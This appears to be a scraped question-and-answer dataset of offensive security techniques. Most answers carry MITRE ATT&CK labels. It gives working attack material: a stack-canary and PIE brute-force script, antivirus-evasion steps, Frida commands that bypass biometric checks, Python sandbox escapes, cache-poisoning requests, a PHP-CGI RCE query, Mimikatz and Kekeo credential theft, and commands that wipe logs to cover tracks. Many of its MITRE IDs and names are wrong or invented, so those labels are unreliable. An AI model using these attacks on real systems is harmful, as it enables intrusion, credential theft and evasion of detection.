A: Bully can be used to perform a WPS brute-force attack on a wireless access point. The command to attack the ESSID "6F36E6" through the monitor mode interface "wlan0mon" is: "bully -e 6F36E6 wlan0mon". Bully will then scan for the beacon, switch to the appropriate channel, and attempt to brute-force the WPS pin. Bully v1.0-22 is used in this example. MITRE References: MITRE ID is T1184, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0006.

## Q: How can we bypass antivirus programs?
A: We need to know what antivirus the target uses, then we can use VirusTotal to check if our malware is detected. To bypass the antivirus, we can try encoding the malware, embedding it in a non-malicious file, or encrypting it to change the signature. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can we encode malware to bypass antivirus detection?
A: We can use msfvenom to encode the malware, setting the -e flag and using the shikata_ga_nai encoding. However, this is not very effective as antivirus vendors have access to Metasploit. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can we embed malware in a non-malicious file to bypass antivirus detection?
A: We can use msfvenom to embed the payload in a non-malicious file, such as calc.exe, to create a new executable that will bypass antivirus detection. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can we encrypt malware to bypass antivirus detection?
A: We can use tools like Hyperion to encrypt the malware, which will radically change the signature and make it harder for antivirus to detect. In Kali, you can find Hyperion in the /usr/share/veil-evasion/tools/hyperion directory and run it using wine. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you brute-force the RBP (Saved Base Pointer) and RIP (Saved Instruction Pointer) in a binary protected by a canary and PIE?
A: To brute-force the RBP and the RIP from the binary, you can use a script like the following:

```pythonfrom pwn import *def connect():    r = remote("localhost", 8788)def get_bf(base):    canary = ""    guess = 0x0    base += canary    while len(canary) < 8:        while guess != 0xff:            r = connect()            r.recvuntil("Username: ")            r.send(base + chr(guess))            if "SOME OUTPUT" in r.clean():                print("Guessed correct byte:", format(guess, '02x'))                canary += chr(guess)                base += chr(guess)                guess = 0x0                r.close()                break            else:                guess += 1                r.close()    print("FOUND:\x" + '\x'.join("{:02x}".format(ord(c)) for c in canary))    return base# CANARY BF HEREcanary_offset = 1176base = "A" * canary_offsetprint("Brute-Forcing canary")base_canary = get_bf(base) #Get junk data + canaryCANARY = u64(base_canary[len(base_canary)-8:]) #Get the canary# PIE BF FROM HEREprint("Brute-Forcing RBP")base_canary_rbp = get_bf(base_canary)RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])print("Brute-Forcing RIP")base_canary_rbp_rip = get_bf(base_canary_rbp)RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])```The last thing you need to defeat the PIE is to calculate useful addresses from the leaked RBP and RIP. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you clobber `document.getElementById` to bypass the first check in the challenge?
A: You can clobber `document.getElementById` with `<img name=getElementById /><div id=calc></div>`. This will make `window.calc.contentWindow` be `undefined`. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you make `e.source` be `null` to bypass the first check in the challenge?
A: Create an iframe, send a postMessage from it, and immediately remove the iframe. This will cause `e.origin` to be `null`. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you bypass the second check in the challenge about the `token`?
A: Send `token` in the postMessage with value `null` and make `window.token` have `undefined` value by triggering an error when accessing `document.cookie` in a `null` origin page. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you bypass IP address restrictions?
A: Use techniques like decimal IP addresses to bypass IP restrictions. MITRE References: MITRE ID is T1095, MITRE Name is: Data Chaff, and MITRE Tactics are: Defense Evasion.

## Q: How can you exfiltrate data using timing-based methods?
A: Use time-based techniques like checking the first character of the output to exfiltrate data. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can you exfiltrate data using DNS-based methods?
A: Use tools like burpcollab or pingb to exfiltrate data over DNS. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can you craft polyglot command injection payloads?
A: Use techniques like combining different comment styles, string interpolation, and other tricks to create polyglot command injection payloads. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you bypass read-only, no-exec, or distroless filesystem restrictions to execute commands?
A: Use techniques like chroot escapes, symlinks, and other tricks to bypass filesystem restrictions and execute commands. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass biometric authentication (Android) using the 'No Crypto Object Usage' method?
A: The focus is on the *onAuthenticationSucceeded* callback, which is crucial in the authentication process. Researchers at WithSecure developed a [Frida script](https://github.com/WithSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js) that enables the bypass of the NULL *CryptoObject* in *onAuthenticationSucceeded(...)* by forcing an automatic bypass of the fingerprint authentication upon the method's invocation. The command to run the Frida script is: `frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass.js`. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: TA0002, TA0005.

## Q: How can you bypass biometric authentication (Android) using the 'Exception Handling' approach?
A: Another [Frida script](https://github.com/WithSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass-via-exception-handling.js) by WithSecure addresses bypassing insecure crypto object usage. The script invokes *onAuthenticationSucceeded* with a *CryptoObject* that hasn't been authorized by a fingerprint. If the application tries to use a different cipher object, it will trigger an exception. The script prepares to invoke *onAuthenticationSucceeded* and handle the *javax.crypto.IllegalBlockSizeException* in the *Cipher* class, ensuring subsequent objects used by the application are encrypted with the new key. To run the Frida script, use the command: `frida -U -f com.generic.insecurebankingfingerprint --no-pause -l fingerprint-bypass-via-exception-handling.js` and then type `bypass()` in the Frida console to activate the bypass. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: TA0002, TA0005.

## Q: How can you bypass biometric authentication (Android) using instrumentation frameworks like Xposed or Frida?
A: Instrumentation frameworks like Xposed or Frida can be used to hook into application methods at runtime. For fingerprint authentication, these frameworks can mock the authentication callbacks by hooking into the `onAuthenticationSucceeded`, `onAuthenticationFailed`, or `onAuthenticationError` methods of the `BiometricPrompt.AuthenticationCallback`, allowing you to control the outcome of the fingerprint authentication process. They can also be used to bypass SSL pinning, which allows an attacker to intercept and modify the traffic between the client and the server, potentially altering the authentication process or stealing sensitive data. The example command for Frida is: `frida -U -l script-to-bypass-authentication.js --no-pause -f com.generic.insecurebankingfingerprint`. MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: TA0003, TA0006.

## Q: How can you bypass biometric authentication (Android) by reverse engineering and code modification?
A: Reverse engineering tools like `APKTool`, `dex2jar`, and `JD-GUI` can be used to decompile an Android application, read its source code, and understand its authentication mechanism. The steps generally include: 1) Decompiling the APK to convert it to a more human-readable format, 2) Analyzing the code to identify potential weaknesses in the fingerprint authentication implementation, and 3) Modifying the code to bypass the fingerprint authentication and recompiling the APK for testing. MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: TA0007.

## Q: What are some custom authentication tools that can be used to bypass biometric authentication (Android)?
A: There are specialized tools and scripts designed to test and bypass authentication mechanisms, such as: 1) MAGISK Modules - MAGISK is a tool for Android that allows users to root their devices and add modules that can modify or spoof hardware-level information, including fingerprints, and 2) Custom-built Scripts - Scripts can be written to interact with the Android Debug Bridge (ADB) or directly with the application's backend to simulate or bypass fingerprint authentication. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: What is the easiest way to bypass read-only or no-exec file system protections?
A: The easiest way to bypass read-only or no-exec file system protections is to use scripts. Even if the file system is mounted as read-only, you can still execute any script as long as the interpreter is inside the machine, such as a shell script or a Python script. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: TA0010.

## Q: How can you execute a binary from memory to bypass file system protections?
A: To execute a binary from memory and bypass file system protections, you can use techniques like FD + exec syscall bypass, DDexec / EverythingExec, or Memdlopen. These techniques allow you to load and execute your own shellcode or any binary from memory, bypassing the read-only or no-exec protections. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: TA0005.

## Q: How can you bypass file system protections in a distroless container?
A: In a distroless container, you might not even find `sh` or `bash` to get a regular shell. However, if the compromised container is running a scripting language like Python, Node.js, or Flask, you can use a reverse shell in that language to enumerate the system and potentially execute binaries from memory using techniques like FD + exec syscall bypass, DDexec / EverythingExec, or Memdlopen. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002.

## Q: How can you perform session hijacking during the payment process?
A: If session tokens are used in the payment process, you can try capturing and manipulating them. This might give insights into session management vulnerabilities. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you intercept and tamper with the responses from the server during the payment process?
A: You can:1. Use tools to intercept and analyze the responses from the server. Look for any data that might indicate a successful transaction or reveal the next steps in the payment process.2. Attempt to modify the responses before they are processed by the browser or the application to simulate a successful transaction scenario. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you bypass Python sandbox protections using the `__builtins__` module?
A: You can access the `__builtins__` module to import and execute arbitrary functions and modules. For example, `__builtins__.__import__("os").system("ls")` will execute the `ls` command. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections using the `__import__()` function?
A: You can use the `__import__()` function to import arbitrary modules and execute code within them. For example, `__import__("os").system("ls")` will execute the `ls` command. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections using the `__del__()` method?
A: You can overwrite the `__del__()` method of a class to execute arbitrary code when an instance of the class is destroyed. This can be used to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using the `__add__()` method?
A: You can overwrite the `__add__()` method of a class to execute arbitrary code when an instance of the class is added to another object. This can be used to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using the `__iadd__()` method?
A: You can overwrite the `__iadd__()` method of a class to execute arbitrary code when an instance of the class is added to in-place. This can be used to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using metaclasses?
A: You can create a metaclass that overrides the `__getitem__()` or other methods to execute arbitrary code when an instance of the class is created, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using exceptions?
A: You can create a custom exception class that overrides the `__init__()` or other methods to execute arbitrary code when the exception is raised, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using the `sys.excepthook` function?
A: You can overwrite the `sys.excepthook` function to execute arbitrary code when an exception is raised, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections using the `__import__()` builtins function?
A: You can use the `__import__()` builtins function to import arbitrary modules and execute code within them, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections using the `__builtins__` module?
A: You can access the `__builtins__` module to import and execute arbitrary functions and modules, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections using format strings?
A: You can use format strings to access sensitive information from Python internal objects, such as `__globals__` and `__builtins__`, which can be used to bypass sandbox protections. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections using the `dis` module?
A: You can use the `dis` module to disassemble the bytecode of a function and extract information about its internals, such as the global variables and imported modules, which can be used to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass Python sandbox protections by compiling and executing custom code?
A: You can use the `compile()` function to create a code object from a string of Python code, and then execute that code object using `eval()` or `exec()`, allowing you to bypass sandbox protections. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you bypass Python sandbox protections by decompiling and re-executing compiled Python code?
A: You can use tools like `decompiler.com` to decompile compiled Python code (`.pyc` files) and then re-execute the decompiled code, which can be used to bypass sandbox protections. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Birthing, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a web cache poisoning vulnerability?
A: To exploit a web cache poisoning vulnerability, you can:
- Identify unkeyed inputs that can be used to manipulate the cached response, like headers or URL parameters
- Craft a malicious payload, such as an XSS attack, and inject it into the unkeyed input
- Ensure the poisoned response is cached by the server so it gets served to other users
Examples include using the `X-Forwarded-For` header for XSS, abusing `X-Forwarded-Host` and `X-Forwarded-Scheme` for open redirects, or using techniques like "fat GET" and "parameter cloaking". MITRE References: MITRE ID is T1530, MITRE Name is: Web Session Deception, and MITRE Tactics are: TA0006.

## Q: How can you perform a cache poisoning attack to cause a Denial of Service (DoS)?
A: To perform a cache poisoning attack to cause a DoS, you can send a request with a bad header value that triggers a 400 Bad Request response, and ensure this response gets cached. Then, any user accessing the affected page will receive the 400 response from the cache, effectively denying service. This technique is known as "Cache Poisoning to DoS". MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: TA0040.

## Q: How can you send a header that contains some harmful meta characters such as \n and \r to try to make the web server respond with an error that might be cached?
A: Send a header that contain some **harmfull meta characters** such as `\n` and `\r`. In order the attack to work you must bypass the cache first. For example:

```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
``` MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can you try to make the web server return an error by abusing the redirect response behaviour to send a URL so big that it returns an error?
A: Like in the following example, x is not being cached, so an attacker could abuse the redirect response behaviour to make the redirect send a URL so big that it returns an error. Then, people trying to access the URL without the uncached x key will get the error response:

```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
``` MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: TA0011, Command and Control.

## Q: How can cadaver be used to perform directory traversal attacks?
A: Cadaver can be used to perform directory traversal attacks by navigating the file system on the remote WebDAV server. For example, you can try to access files outside of the web root directory using the 'cd' command. The version of cadaver used in this example is 0.24.0. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: TA0008.

## Q: How could cadaver be used to upload malicious files to a web server?
A: Cadaver can be used to upload malicious files to a vulnerable WebDAV server by using the 'put' command. For example, you could upload a web shell script and then access it through the web server. This could allow an attacker to gain remote code execution on the target system. The version of cadaver used in this example is 0.24.0. MITRE References: MITRE ID is T1567, MITRE Name is: Exfiltration Over Web Service, and MITRE Tactics are: TA0010.

## Q: How can you omit the captcha parameter to bypass it?
A: Avoid sending the captcha parameter. Experiment with changing the HTTP method from POST to GET or other verbs, and altering the data format, such as switching between form data and JSON. MITRE References: MITRE ID is T1592, MITRE Name is: Obtain Capabilities, and MITRE Tactics are: TA0001, TA0002.

## Q: How can you attempt to use previously successful captcha values again to bypass the captcha?
A: Attempt to use previously successful captcha values again. Keep in mind that they might expire at any time. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006.

## Q: How can you perform brute-force attacks against a Cassandra database?
A: You can perform brute-force attacks against a Cassandra database by attempting to guess valid credentials. Refer to the [Brute Force](/generic-methodologies-and-resources/brute-force#cassandra) section for more information on how to conduct brute-force attacks against Cassandra. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can I bypass the restriction of exporting a private key that is set as non-exportable?
A: If a private key is set as non-exportable, both CAPI and CNG will normally block the extraction of such certificates. To bypass this restriction, you can use tools like **Mimikatz**. Mimikatz offers `crypto::capi` and `crypto::cng` commands to patch the respective APIs, allowing for the exportation of private keys. Specifically, `crypto::capi` patches the CAPI within the current process, while `crypto::cng` targets the memory of **lsass.exe** for patching. MITRE References: MITRE ID is T1003.001, MITRE Name is: OS Credential Dumping: LSASS Memory, and MITRE Tactics are: TA0006.

## Q: How can I find certificate files that may be useful for privilege escalation or lateral movement?
A: You can search for certificate files in the file system using PowerShell or the command prompt by looking for common certificate file extensions such as `.pfx`, `.p12`, `.pkcs12`, `.pem`, `.key`, `.crt`, `.cer`, `.csr`, `.jks`, `.keystore`, and `.keys`.

Example PowerShell command:
```powershellGet-ChildItem -Recurse -Path C:\Users\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.crt, *.cer, *.csr, *.jks, *.keystore, *.keys```

If you find a PKCS#12 certificate file that is protected by a password, you can extract a hash using the `pfx2john.py` tool and then attempt to crack the password using JohnTheRipper.

Example commands:
```pfx2john.py certificate.pfx > hash.txtjohn --wordlist=passwords.txt hash.txt``` MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: TA0007.

## Q: How can I use PKINIT to steal NTLM credentials?
A: To support NTLM authentication for applications that do not facilitate Kerberos authentication, the KDC is designed to return the user's NTLM one-way function (OWF) within the privilege attribute certificate (PAC), specifically in the `PAC_CREDENTIAL_INFO` buffer, when PKCA is utilized. Consequently, should an account authenticate and secure a Ticket-Granting Ticket (TGT) via PKINIT, a mechanism is inherently provided which enables the current host to extract the NTLM hash from the TGT to uphold legacy authentication protocols.

The utility **Kekeo**, accessible at <https://github.com/gentilkiwi/kekeo>, is capable of requesting a TGT containing this specific data, thereby facilitating the retrieval of the user's NTLM. The command utilized for this purpose is as follows:

```tgt::pac /caname:generic-DC-CA /subject:genericUser /castore:current_user /domain:domain.local```

Additionally, Kekeo can process smartcard-protected certificates, given the pin can be retrieved, with reference made to <https://github.com/CCob/PinSwipe>. The same capability is indicated to be supported by **Rubeus**, available at <https://github.com/GhostPack/Rubeus>. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: TA0006.

## Q: How can you use Certipy to enumerate and abuse Active Directory Certificate Services?
A: Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). You can use Certipy version 4.7.0 to find, enumerate, and interact with AD CS infrastructure. Some key features include:

- `certipy find` to discover AD CS servers and get information about CAs, templates, and issued certificates
- `certipy req` to request certificates from the CA using various authentication methods
- `certipy cert` to manage certificates and private keys
- `certipy shadow` to abuse shadow credentials for account takeover
- `certipy forge` to create Golden Certificates for privilege escalation MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use Certipy to perform NTLM relay attacks against Active Directory Certificate Services?
A: Certipy version 4.7.0 includes the `certipy relay` command, which can be used to perform NTLM relay attacks against AD CS HTTP endpoints. This can allow an attacker to obtain certificates or perform other privileged actions. For example, you can use `certipy relay --target-host adcs.domain.com --target-port 80 --smb-server your-smb-server` to relay NTLM authentication to the AD CS server and potentially gain a privileged certificate. Certipy handles the NTLM negotiation and relay process automatically. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Lateral Movement, Privilege Escalation, Defense Evasion.

## Q: How can you exploit the Old PHP + CGI = RCE vulnerability?
A: If cgi is active and php is old (< 5.3.12 / < 5.4.2), you can execute code. To exploit this, you need to access a PHP file of the web server without sending parameters, especially without sending the '=' character. Then, you can send a special query like '/?-d allow_url_include=1 -d auto_prepend_file=php://input' and the PHP code to be executed in the body of the request. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use a proxy to perform a MitM attack on web server requests?
A: CGI creates an environment variable for each header in the HTTP request, such as 'HTTP_HOST' for 'host:web.com'. You can try sending a header containing 'Proxy: <IP_attacker>:<PORT>' and if the server performs any request during the session, you will be able to capture each request made by the server. MITRE References: MITRE ID is T1111, MITRE Name is: Two-Phase Access, and MITRE Tactics are: Lateral Movement.

## Q: How can you obtain system information for Windows local privilege escalation?
A: To obtain system information for Windows local privilege escalation, you can:

- Obtain [**System information**](/windows-hardening/windows-local-privilege-escalation#system-info)
- Search for **kernel** [**exploits using scripts**](/windows-hardening/windows-local-privilege-escalation#version-exploits)
- Use **Google to search** for kernel **exploits**
- Use **searchsploit to search** for kernel **exploits** MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: How can you get the content of the clipboard for Windows local privilege escalation?
A: To get the content of the clipboard for Windows local privilege escalation, you can check [**What is inside the Clipboard**](/windows-hardening/windows-local-privilege-escalation#get-the-content-of-the-clipboard). MITRE References: MITRE ID is T1115, MITRE Name is: Clipboard Data, and MITRE Tactics are: Collection.

## Q: How can chisel be used in a penetration test to bypass firewalls?
A: Chisel can be used to establish a secure tunnel through a firewall, allowing access to internal resources. For example, the chisel server can be run on a machine inside the network, and the chisel client can be run on the pentesting machine outside the network. This creates an encrypted tunnel that can bypass firewall restrictions. Version 1.9.1 of chisel supports both TCP and UDP tunneling. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How can Chromium be used to perform browser-based attacks?
A: Chromium can be used to perform browser-based attacks through features like the remote debugger protocol and Chromium DevTools. With the remote debugger protocol, an attacker can connect to a running Chromium instance and control the browser's actions programmatically. This allows for automated interactions with web pages and the ability to inject code or perform other malicious activities. The Chromium DevTools also provide advanced debugging and inspection capabilities that could potentially be leveraged for security testing or exploitation. However, these features should only be used for authorized, ethical purposes. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you impersonate the "admin" username by creating the username "bdmin" and brute-forcing the first byte of the cookie?
A: If the cookie is only the username (or the first part of the cookie is the username) and you want to impersonate the username "admin", you can create the username "bdmin" and bruteforce the first byte of the cookie. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access.

## Q: What other vulnerabilities can the Cisco Global Exploiter (CGE) tool version 13-1kali5 target?
A: The Cisco Global Exploiter (CGE) tool version 13-1kali5 can target the following vulnerabilities:1. Cisco 677/678 Telnet Buffer Overflow Vulnerability2. Cisco IOS Router Denial of Service Vulnerability 3. Cisco IOS HTTP Auth Vulnerability4. Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability5. Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability6. Cisco 675 Web Administration Denial of Service Vulnerability7. Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability8. Cisco IOS Software HTTP Request Denial of Service Vulnerability9. Cisco 514 UDP Flood Denial of Service Vulnerability10. CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability11. Cisco Catalyst Memory Leak Vulnerability12. Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability13. 0 Encoding IDS Bypass Vulnerability (UTF)14. Cisco IOS HTTP Denial of Service Vulnerability MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: TA0009.

## Q: How can you use cisco-ocs v0.2 to attempt to exploit Cisco devices in a given IP range?
A: To use cisco-ocs v0.2 to attempt to exploit Cisco devices in a given IP range, you can run the following command:

```console
root@kali:~# cisco-ocs 192.168.99.200 192.168.99.202
```

This will scan the IP range from 192.168.99.200 to 192.168.99.202 and log any vulnerable Cisco devices. The tool will display information about the status of each IP address in the range. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can one obtain a root shell on Cisco vManage using a vulnerability in the 'confd_cli' program?
A: 1. The 'confd_ipc_secret' file can be retrieved using a Neo4j vulnerability to read arbitrary files. This secret is used to authenticate the IPC socket.
2. The 'confd_cli_user' program is not readable with current privileges, so it needs to be copied from the rootfs using SCP.
3. The 'confd_cli_user' program can then be used with the 'confd_ipc_secret' to obtain a root shell. MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: Execution.

## Q: How can one escalate privileges to root on Cisco vManage by manipulating the 'confd_cli' program?
A: 1. The 'confd_cli' program calls '/usr/bin/confd_cli_user' and passes the user ID and group ID of the logged-in user.
2. By using GDB to force the 'getuid' and 'getgid' functions to return 0, the 'confd_cli_user' program will be executed with root privileges, providing a root shell. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can I clear logs and cover my tracks on Linux?
A: On Linux, you can clear various log files to cover your tracks:- /var/log/messages: Contains failed and successful login attempts, SSH, SUDO, etc. You can remove your IP address using `grep -v '<src-ip-address>' /path/to/access_log > a && mv a /path/to/access_log`.- /var/log/auth.log: Contains authentication logs. You can use a similar command to remove your IP.- /var/log/apache2/access.log and /var/log/apache2/error.log: Apache logs. Use `grep -v '<entry-to-remove>' <logfile> > /tmp/a ; mv /tmp/a <logfile> ; rm -f /tmp/a` to remove entries.- UTMP and WTMP logs are stored in binary format, making them harder to clear. Use `who`, `last`, and `lastlog` commands to view them.- Command history is stored in $HISTFILE. Set $HISTSIZE=0 to avoid storing commands. MITRE References: MITRE ID is T1070, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: Defense Evasion.

## Q: How can I clear event logs on Windows to cover my tracks?
A: On Windows, you can clear event logs to cover your tracks. Refer to the Offensive Security guide at https://www.offensive-security.com/metasploit-unleashed/event-log-management/ for more information. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: What is a Drag&Drop + Click Clickjacking payload?
A: The Drag&Drop + Click Clickjacking payload includes an iframe with the target site, a draggable element that the user has to drag to a specific location, and a 'Click me' div that the user has to click after the drag operation to trigger the attack. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can a client side path traversal be combined with an open redirect?
A: A client side path traversal can be combined with an open redirect to load a CSS resource from an attacker controlled domain and achieve further exploitation, as shown in the writeup at https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you bypass client-side HTML sanitizers using prototype pollution?
A: According to the research at https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/, it is possible to bypass the sanitization provided by some HTML sanitizer libraries, such as `sanitize-html`, `dompurify`, and `Closure`, by using prototype pollution gadgets. For example, the following code can be used to bypass the Closure sanitizer:```html<script>  Object.prototype['* ONERROR'] = 1;  Object.prototype['* SRC'] = 1;</script><script src=https://google.github.io/closure-library/source/closure/goog/base.js></script><script>  goog.require('goog.html.sanitizer.HtmlSanitizer');  goog.require('goog.dom');</script><body><script>  const html = '<img src onerror=alert(1)>';  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();  const sanitized = sanitizer.sanitize(html);  const node = goog.dom.safeHtmlToNode(sanitized);            document.body.append(node);</script>``` MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit CSTI vulnerabilities in AngularJS applications?
A: You can exploit CSTI vulnerabilities in AngularJS by using payloads like:
```
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>
```
Organizations using AngularJS versions prior to 1.6 may be vulnerable to these types of CSTI attacks. MITRE References: MITRE ID is T1template, MITRE Name is: Template Injection, and MITRE Tactics are: TA0042.

## Q: How can you exploit CSTI vulnerabilities in VueJS applications?
A: You can exploit CSTI vulnerabilities in VueJS by using payloads like:
```
{{this.constructor.constructor('alert("foo")')()}}
```
For VueJS v3, you can use:
```
{{_openBlock.constructor('alert(1)')()}}
```
And for VueJS v2, you can use:
```
{{constructor.constructor('alert(1)')()}}
